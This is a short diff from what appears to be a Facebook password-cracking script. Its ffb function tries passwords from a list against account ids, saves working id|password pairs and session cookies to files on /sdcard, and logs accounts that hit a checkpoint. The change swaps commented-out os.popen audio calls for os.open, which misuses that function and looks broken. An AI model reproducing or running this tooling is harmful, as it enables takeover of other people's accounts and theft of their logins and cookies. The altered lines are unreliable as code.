@@ -307,14 +307,14 @@ def ffb(ids,names,passlist):
                                 print('\r\r\033[1;32m [RAHUL-OK] %s | %s'%(ids,pas))
                                 open('/sdcard/RAHUL-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 open('/sdcard/RB-COOKIES.txt', 'a').write(ids+'|'+kuki+'\n')
-                                #os.popen('play-audio data/ok.mp3')
+                                os.open('play-audio data/ok.mp3')
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Rahul:
                                 if 'y' in pcp:
                                         print('\r\r\x1b[38;5;208m [RAHUL-CP] '+ids+' | '+pas+'\033[1;97m')
                                         open('/sdcard/RAHUL-CP.txt', 'a').write(ids+'|'+pas+'\n')
-                                        #os.popen('play-audio data/cp.mp3')
+                                        os.open('play-audio data/cp.mp3')
                                         cps.append(ids)
                                         break
                                         
